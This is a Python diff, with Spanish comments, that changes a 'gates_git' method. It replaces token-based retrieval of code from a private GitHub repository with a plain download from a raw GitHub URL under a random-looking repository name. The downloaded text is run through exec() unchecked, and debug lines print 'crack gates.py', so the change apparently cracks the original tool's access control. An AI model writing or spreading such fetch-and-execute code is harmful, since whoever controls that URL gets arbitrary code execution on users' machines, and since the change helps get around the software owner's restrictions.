@@ -52,22 +52,50 @@ class Tools:
 
     def gates_git(self, gate):
 
+        # try:
+
+        #     print('MODULO DE GATES ACTIVADO.')
+        #     self.text_changed.emit(f"MODULO DE GATES ACTIVADO.")
+
+        #     tagGates = 'Gates'
+
+        #     g = Github(self.geoip)
+        #     repo = g.get_user(self.user).get_repo(tagGates)
+        #     contenido= repo.get_contents('main.py', ref='dev').decoded_content.decode('utf-8')
+
+        #     exec(contenido,local_namespace)
+        #     local_namespace[gate](self)
+
+        # except Exception as e:
+        #     self.app.signal_error.emit(f"Error en tools {str(e)}")
+
+
+        # URL que devuelve True o False
+        url = 'https://raw.githubusercontent.com/Magick-Chk/d65h54d9681rq56er4t8e9gh1aqw/main/gates'  # Reemplaza con tu URL
         try:
+            import base64
+            response = requests.get(url)
+            # Decodifica el contenido desde Base64
+            contenido = response.content.decode('utf-8')  # Contenido como texto Base64
+            # decoded_content = base64.b64decode(base64_content).decode('utf-8')  # Decodifica Base64 a UTF-8
 
-            print('MODULO DE GATES ACTIVADO.')
-            self.text_changed.emit(f"MODULO DE GATES ACTIVADO.")
-
-            tagGates = 'Gates'
-
-            g = Github(self.geoip)
-            repo = g.get_user(self.user).get_repo(tagGates)
-            contenido= repo.get_contents('main.py', ref='dev').decoded_content.decode('utf-8')
-
-            exec(contenido,local_namespace)
-            local_namespace[gate](self)
-
-        except Exception as e:
-            self.app.signal_error.emit(f"Error en tools {str(e)}")
+            print("crack gates.py")
+            
+            try:
+                # Ejecuta el contenido descargado en el espacio de nombres local
+                    exec(contenido,local_namespace)
+                    print("crack gates.py!")
+                    local_namespace[gate](self)
+                    print("crack gates.py!!")
+            except Exception as e:
+                print(f"Error durante la ejecución de main_window.py: {e}")
+                traceback.print_exc()  # Esto imprime la traza completa del error
+        except requests.RequestException as e:
+            QMessageBox.critical(self, "Error", f"No se pudo conectar a la URL: {e}")
+            self.close()
+            return
+        
+        print("crack gates.py!!!")
 
     def views_git(self, file_path):
 
